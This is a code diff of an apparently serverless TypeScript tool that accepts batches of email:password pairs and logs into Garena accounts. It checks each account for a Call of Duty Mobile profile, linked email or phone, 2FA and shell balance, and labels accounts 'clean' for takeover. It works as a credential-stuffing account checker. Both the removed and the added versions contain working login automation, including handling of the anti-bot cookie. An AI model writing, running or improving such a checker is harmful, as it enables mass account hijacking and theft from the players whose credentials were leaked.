-async function processCodmCallback(accessToken: string): Promise<{ token: string | null; status: string }> {
-  try {
-    // First callback
-    const codmCallbackUrl = `https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token=${accessToken}`;
-    
-    const headers = {
-      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-      'referer': 'https://auth.garena.com/',
-      'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
-    };
-
-    await fetch(codmCallbackUrl, { headers, redirect: 'manual' });
-
-    // Second callback
-    const apiCallbackUrl = `https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token=${accessToken}`;
-    const apiResponse = await fetch(apiCallbackUrl, { headers, redirect: 'manual' });
-    
-    const location = apiResponse.headers.get('location') || '';
-    
-    if (location.includes('err=3')) {
-      return { token: null, status: 'no_codm' };
-    } else if (location.includes('token=')) {
-      const token = location.split('token=')[1]?.split('&')[0];
-      return { token: token || null, status: 'success' };
-    }
-    
-    return { token: null, status: 'unknown_error' };
-  } catch (error) {
-    console.error('CODM callback error:', error);
-    return { token: null, status: 'error' };
-  }
-}
-
-async function getCodmUserInfo(token: string): Promise<any> {
-  const headers = {
-    'accept': 'application/json, text/plain, */*',
-    'codm-delete-token': token,
-    'origin': 'https://delete-request.codm.garena.co.id',
-    'referer': 'https://delete-request.codm.garena.co.id/',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
-  };
-
-  try {
-    const response = await fetch('https://api-delete-request.codm.garena.co.id/oauth/check_login/', { headers });
-    const data = await response.json();
-    
-    const user = data.user || {};
-    return {
-      codm_nickname: user.codm_nickname || 'N/A',
-      codm_level: user.codm_level || 'N/A',
-      region: user.region || 'N/A',
-      uid: user.uid || 'N/A',
-      open_id: user.open_id || 'N/A'
-    };
-  } catch (error) {
-    console.error('CODM user info error:', error);
-    return null;
-  }
-}
-
-function parseAccountDetails(data: any): any {
-  const userInfo = data.user_info || data || {};
-  
-  const email = userInfo.email || 'N/A';
-  const mobile = userInfo.mobile_no || 'N/A';
-  const fbConnected = userInfo.is_fbconnect_enabled || false;
-  const emailVerified = userInfo.email_v === 1;
-  
-  const binds: string[] = [];
-  if (email !== 'N/A' && email && !email.startsWith('***') && email.includes('@')) binds.push('Email');
-  if (mobile !== 'N/A' && mobile && String(mobile).trim()) binds.push('Phone');
-  if (fbConnected) binds.push('Facebook');
-  if (userInfo.idcard && String(userInfo.idcard).trim()) binds.push('ID Card');
-  
-  const isClean = !emailVerified && binds.length === 0;
-  
-  return {
-    uid: userInfo.uid || 'N/A',
-    username: userInfo.username || 'N/A',
-    nickname: userInfo.nickname || 'N/A',
-    email: email,
-    email_verified: emailVerified,
-    mobile: mobile,
-    country: userInfo.acc_country || 'N/A',
-    shell_balance: userInfo.shell || 0,
-    is_clean: isClean,
-    bind_status: isClean ? 'Clean' : `Bound (${binds.join(', ')})`,
-    security: {
-      two_step_verify: userInfo.two_step_verify_enable || false,
-      authenticator: userInfo.authenticator_enable || false,
-      facebook: fbConnected
-    }
-  };
-}
-
-async function checkAccount(account: string, password: string): Promise<any> {
-  try {
-    // Get datadome cookie
-    const datadome = await getDatadomeCookie();
-    if (!datadome) {
-      return { status: 'error', message: 'Failed to get security cookie' };
+    if (data.access_token) {
+      return data.access_token;
     }
 
-    // Prelogin
-    const preloginResult = await prelogin(account, datadome);
-    if (!preloginResult) {
-      return { status: 'invalid', message: 'Prelogin failed - Invalid account' };
-    }
-
-    const currentDatadome = preloginResult.newDatadome || datadome;
-
-    // Login
-    const loginResult = await login(account, password, preloginResult.v1, preloginResult.v2, currentDatadome);
-    if (!loginResult.ssoKey) {
-      return { status: 'invalid', message: 'Login failed - Invalid credentials' };
-    }
-
-    const finalDatadome = loginResult.newDatadome || currentDatadome;
-
-    // Get account info
-    const accountInfo = await getAccountInfo(loginResult.ssoKey, finalDatadome);
-    if (accountInfo.error) {
-      return { status: 'error', message: accountInfo.error };
-    }
-
-    const details = parseAccountDetails(accountInfo);
-
-    // Check CODM
-    const codmAccessToken = await getCodmAccessToken(loginResult.ssoKey, finalDatadome);
-    let codmInfo = null;
-    let hasCodm = false;
-
-    if (codmAccessToken) {
-      const codmCallback = await processCodmCallback(codmAccessToken);
-      if (codmCallback.status === 'success' && codmCallback.token) {
-        codmInfo = await getCodmUserInfo(codmCallback.token);
-        hasCodm = codmInfo && codmInfo.codm_nickname !== 'N/A';
+    if (data.redirect_uri) {
+      const match = data.redirect_uri.match(/access_token=([^&]+)/);
+      if (match) {
+        return match[1];
       }
     }
 
+    return null;
+  }, 2, 'getCodmAccessToken');
+}
+
+async function getCodmUserInfo(accessToken: string): Promise<Record<string, unknown> | null> {
+  return await withRetry(async () => {
+    // Get CODM profile using the access token
+    const response = await fetch('https://codm-api.garena.com/api/user/profile', {
+      method: 'GET',
+      headers: {
+        'Authorization': `Bearer ${accessToken}`,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': 'application/json',
+      },
+    });
+
+    if (!response.ok) {
+      // Try alternative endpoint
+      const altResponse = await fetch(`https://codm.garena.com/api/profile?token=${accessToken}`, {
+        method: 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        },
+      });
+      
+      if (altResponse.ok) {
+        return await altResponse.json();
+      }
+      return null;
+    }
+
+    return await response.json();
+  }, 2, 'getCodmUserInfo');
+}
+
+function parseAccountDetails(data: Record<string, unknown>): Record<string, unknown> {
+  return {
+    uid: data.uid || data.user_id || data.id || null,
+    nickname: data.nickname || data.name || data.username || null,
+    email: data.email || null,
+    country: data.country || data.region || null,
+    shell_balance: data.shells || data.shell_balance || data.balance || 0,
+    bind_status: data.bind_status || (data.email ? 'Bound' : 'Unbound'),
+    created_at: data.created_at || data.create_time || null,
+    level: data.level || null,
+  };
+}
+
+async function checkAccount(account: string, password: string): Promise<Record<string, unknown>> {
+  console.log(`[CHECK] Starting check for: ${account}`);
+  
+  try {
+    // Step 1: Prelogin to get v1/v2 tokens
+    const preloginResult = await prelogin(account);
+    
+    if (!preloginResult) {
+      console.log(`[CHECK] Prelogin failed for: ${account}`);
+      return {
+        account,
+        password,
+        status: 'invalid',
+        message: 'Account not found or prelogin failed',
+        isClean: false,
+        hasCodm: false,
+      };
+    }
+
+    console.log(`[CHECK] Prelogin success, got v1/v2 tokens`);
+
+    // Step 2: Login with hashed password
+    const loginResult = await login(account, password, preloginResult.v1, preloginResult.v2);
+
+    if ('error' in loginResult) {
+      console.log(`[CHECK] Login failed for ${account}: ${loginResult.error}`);
+      return {
+        account,
+        password,
+        status: 'invalid',
+        message: loginResult.error,
+        isClean: false,
+        hasCodm: false,
+      };
+    }
+
+    console.log(`[CHECK] Login success for: ${account}`);
+
+    // Step 3: Get account info
+    let accountInfo: Record<string, unknown> | null = null;
+    try {
+      accountInfo = await getAccountInfo(loginResult.ssoKey);
+    } catch (e) {
+      console.log(`[CHECK] Failed to get account info: ${e}`);
+    }
+
+    const details = accountInfo ? parseAccountDetails(accountInfo) : {};
+
+    // Step 4: Check for CODM
+    let hasCodm = false;
+    let codmInfo: Record<string, unknown> = {};
+
+    try {
+      const codmToken = await getCodmAccessToken(loginResult.ssoKey);
+      if (codmToken) {
+        const codmData = await getCodmUserInfo(codmToken);
+        if (codmData && (codmData.uid || codmData.player_id || codmData.nickname)) {
+          hasCodm = true;
+          codmInfo = {
+            codm_uid: codmData.uid || codmData.player_id || null,
+            codm_nickname: codmData.nickname || codmData.name || null,
+            codm_level: codmData.level || codmData.player_level || null,
+            codm_region: codmData.region || codmData.server || null,
+          };
+        }
+      }
+    } catch (e) {
+      console.log(`[CHECK] CODM check failed: ${e}`);
+    }
+
+    // Determine if account is "clean" (no games linked, fresh account)
+    const isClean = !hasCodm && !details.shell_balance;
+
+    console.log(`[CHECK] Complete for ${account}: valid=${true}, hasCodm=${hasCodm}, isClean=${isClean}`);
+
     return {
-      status: 'valid',
       account,
       password,
+      status: 'valid',
+      isClean,
+      hasCodm,
       details,
       codm: codmInfo,
-      hasCodm,
-      isClean: details.is_clean
     };
+
   } catch (error) {
-    console.error('Check account error:', error);
-    return { status: 'error', message: String(error) };
+    console.error(`[CHECK] Error checking ${account}:`, error);
+    return {
+      account,
+      password,
+      status: 'error',
+      message: error instanceof Error ? error.message : 'Unknown error',
+      isClean: false,
+      hasCodm: false,
+    };
   }
 }
 
 serve(async (req) => {
   // Handle CORS preflight
-  if (req.method === "OPTIONS") {
+  if (req.method === 'OPTIONS') {
     return new Response(null, { headers: corsHeaders });
   }
 
   try {
-    // Get client identifier for rate limiting
-    const clientIp = req.headers.get('x-forwarded-for') || 
-                     req.headers.get('x-real-ip') || 
-                     'unknown';
-    const clientId = clientIp.split(',')[0].trim();
-    
+    const clientId = req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || 'unknown';
     console.log(`[REQUEST] Incoming request from client: ${clientId}`);
-    
+
     // Check rate limit
-    const rateCheck = checkRateLimit(clientId);
-    if (!rateCheck.allowed) {
+    const rateLimitCheck = checkRateLimit(clientId);
+    if (!rateLimitCheck.allowed) {
       console.log(`[RATE_LIMIT] Client ${clientId} exceeded rate limit`);
       return new Response(
-        JSON.stringify({ 
-          error: "Rate limit exceeded", 
-          retryAfter: rateCheck.retryAfter,
-          message: `Too many requests. Please wait ${rateCheck.retryAfter} seconds.`
-        }),
+        JSON.stringify({ error: 'Rate limit exceeded', retryAfter: rateLimitCheck.retryAfter }),
         { 
           status: 429, 
-          headers: { 
-            ...corsHeaders, 
-            "Content-Type": "application/json",
-            "Retry-After": String(rateCheck.retryAfter)
-          } 
+          headers: { ...corsHeaders, 'Content-Type': 'application/json', 'Retry-After': String(rateLimitCheck.retryAfter) }
         }
       );
     }
 
     const { accounts } = await req.json();
-    
+
     if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
       return new Response(
-        JSON.stringify({ error: "No accounts provided" }),
-        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
+        JSON.stringify({ error: 'No accounts provided' }),
+        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
       );
     }
 
-    // Limit accounts per request to prevent abuse
-    if (accounts.length > MAX_ACCOUNTS_PER_REQUEST) {
-      console.log(`[LIMIT] Request exceeded max accounts: ${accounts.length}/${MAX_ACCOUNTS_PER_REQUEST}`);
-      return new Response(
-        JSON.stringify({ 
-          error: "Too many accounts", 
-          message: `Maximum ${MAX_ACCOUNTS_PER_REQUEST} accounts per request. You sent ${accounts.length}.`
-        }),
-        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
-      );
-    }
+    // Limit accounts per request
+    const MAX_ACCOUNTS = 1;
+    const accountsToProcess = accounts.slice(0, MAX_ACCOUNTS);
 
-    console.log(`[PROCESS] Processing ${accounts.length} accounts for client ${clientId}`);
+    console.log(`[PROCESS] Processing ${accountsToProcess.length} accounts for client ${clientId}`);
 
-    // Process accounts one by one with retry logic
     const results = [];
-    for (const acc of accounts) {
-      const [account, password] = acc.split(':');
-      if (!account || !password) {
-        results.push({ status: 'error', message: 'Invalid format (use email:password)', account: acc });
+
+    for (const accountLine of accountsToProcess) {
+      const parts = accountLine.split(':');
+      if (parts.length < 2) {
+        results.push({
+          account: accountLine,
+          status: 'invalid',
+          message: 'Invalid format. Expected: email:password',
+        });
         continue;
       }
+
+      const account = parts[0].trim();
+      const password = parts.slice(1).join(':').trim();
+
+      const result = await checkAccount(account, password);
+      results.push(result);
       
-      try {
-        const result = await withRetry(
-          () => checkAccount(account.trim(), password.trim()),
-          2,
-          `Check account ${account}`
-        );
-        results.push(result);
-        console.log(`[RESULT] ${account}: ${result.status}`);
-      } catch (error) {
-        console.error(`[ERROR] Failed to check ${account} after retries:`, error);
-        results.push({ 
-          status: 'error', 
-          message: 'Failed after multiple retries', 
-          account: account.trim() 
-        });
-      }
-      
-      // Delay between accounts to avoid rate limiting from Garena API
-      await new Promise(resolve => setTimeout(resolve, 1500));
+      console.log(`[RESULT] ${account}: ${result.status}`);
     }
 
     console.log(`[COMPLETE] Processed ${results.length} accounts for client ${clientId}`);
 
     return new Response(
-      JSON.stringify({ 
-        results,
-        processed: results.length,
-        timestamp: new Date().toISOString()
-      }),
-      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
+      JSON.stringify({ results }),
+      { 
+        status: 200, 
+        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+      }
     );
+
   } catch (error) {
-    console.error("[ERROR] Request failed:", error);
+    console.error('[ERROR] Request processing failed:', error);
     return new Response(
-      JSON.stringify({ error: String(error) }),
-      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
+      JSON.stringify({ error: error instanceof Error ? error.message : 'Internal server error' }),
+      { 
+        status: 500, 
+        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+      }
     );
   }
 });
